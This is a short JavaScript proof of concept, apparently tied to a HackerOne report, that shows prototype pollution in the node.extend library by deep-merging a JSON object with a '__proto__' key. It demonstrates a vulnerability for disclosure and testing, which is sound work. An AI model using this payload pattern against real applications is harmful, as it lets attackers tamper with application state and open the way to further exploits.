//https://hackerone.com/reports/430831
    let extend = require('node.extend');
    var obj = {}
    
    extend(true, {}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
